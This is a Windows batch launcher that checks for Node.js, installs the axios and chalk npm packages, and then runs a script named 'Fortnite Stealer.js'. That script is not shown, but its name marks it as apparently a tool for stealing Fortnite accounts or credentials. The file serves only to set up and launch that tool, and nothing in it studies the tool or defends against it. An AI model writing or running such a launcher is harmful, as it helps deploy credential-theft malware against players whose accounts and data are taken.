@echo off
node -v >nul 2>&1
if errorlevel 1 (
    echo Node.js is not installed. Please install it from https://nodejs.org/.
    pause
    exit /b
)

echo Installing necessary packages...
npm install axios
if errorlevel 1 (
    echo Failed to install axios. Check your npm setup.
    pause
    exit /b
)

npm install chalk
if errorlevel 1 (
    echo Failed to install chalk. Check your npm setup.
    pause
    exit /b
)

echo Running Fortnite Stealer.js...
node "Fortnite Stealer.js"
if errorlevel 1 (
    echo Script execution failed. Check your code for errors.
    pause
    exit /b
)

pause
